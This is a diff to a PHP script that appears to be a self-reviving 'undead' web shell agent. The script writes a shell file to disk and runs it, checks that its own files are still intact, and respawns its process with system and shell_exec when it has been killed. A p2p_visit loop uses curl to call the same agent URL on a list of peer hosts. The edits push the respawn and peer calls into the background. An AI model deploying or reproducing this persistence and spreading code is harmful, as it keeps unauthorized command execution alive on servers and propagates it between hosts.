@@ -16,9 +16,9 @@ $agent_name = __FILE__;
 $agent_url = '{{agent_url}}';
 
 function start_undead(){
-    global $undead_shell,$shell_name;
-    file_put_contents($shell_name, $undead_shell);
-    system("php ".$shell_name);
+    global $undead_shell,$shell_name,$undead_release_shell;
+    file_put_contents($shell_name, $undead_release_shell);
+    //shell_exec("php ".$shell_name." & ");
 }
 
 function start_agent(){
@@ -29,18 +29,18 @@ function start_agent(){
 
 function check_undead(){
     global $undead_release_shell,$shell_name;
-    if(file_get_contents($shell_name)!=$undead_release_shell){
-	return False;
+    if(file_get_contents($shell_name)===$undead_release_shell){
+	return True;
     }
-    return True;
+    return False;
 }
 
 function check_agent(){
     global $agent_name, $agent_shell;
-    if(file_get_contents($agent_name)!=$agent_shell){
-	return False;
+    if(file_get_contents($agent_name)===$agent_shell){
+	return True;
     }
-    return True;
+    return False;
 }
 
 function check_agent_process(){
@@ -55,7 +55,7 @@ function check_agent_process(){
 function p2p_visit(){
     global $peer_addr,$agent_url;
     foreach($peer_addr as $addr){
-	system('curl "http://'.$addr.$agent_url.'" -m 1 2>/dev/null');
+	system('curl "http://'.$addr.$agent_url.'" -m 1 2>/dev/null & ');
     }
 }
 
@@ -75,7 +75,7 @@ if(PHP_SAPI_NAME()=='cli'){
 }else{
     if(!check_agent_process()){
 	echo "\nprocess dies\n";
-	system('php '.$agent_name);
+	shell_exec('php '.$agent_name.' &' );
     }
     echo 'OK';
 }
